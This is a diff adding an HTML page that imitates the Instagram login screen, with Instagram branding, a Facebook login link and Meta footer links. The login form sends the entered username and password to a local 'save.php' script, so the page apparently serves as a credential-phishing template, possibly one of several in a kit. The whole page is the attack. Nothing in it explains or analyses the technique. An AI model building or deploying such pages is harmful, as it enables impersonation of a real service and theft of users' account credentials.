@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="../../logo.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div id="container">
+        <div id="login-section">
+            <img src="img/instagraa.png" alt="Instagram" id="logo">
+            <form action="save.php" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" class="input-field" required>
+                <input type="password" name="password" placeholder="Password" class="input-field" required>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="separator">
+                <div class="line"></div>
+                <span>OR</span>
+                <div class="line"></div>
+            </div>
+            <div class="facebook-login">
+                <a href="#" class="fb-link">
+                    <img src="img/face.png" alt="Facebook Icon"> Log in with Facebook
+                </a>
+            </div>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+        <div id="signup-section">
+            <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+        <div id="app-section">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <a href="#"><img src="img/google.png" alt="Google Play"></a>
+                <a href="#"><img src="img/microsoft.png" alt="Microsoft Store"></a>
+            </div>
+        </div>
+        <div id="footer">
+            <ul class="footer-links">
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Top Accounts</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+                <li><a href="#">Threads</a></li>
+            </ul>
+            <select>
+                <option value="en" selected>English</option>
+                <option value="tr">Turkish</option>
+                <!-- More languages can be listed here -->
+            </select>
+            <p>&copy; 2024 Instagram from Meta</p>
+        </div>
+    </div>
+</body>
+</html>
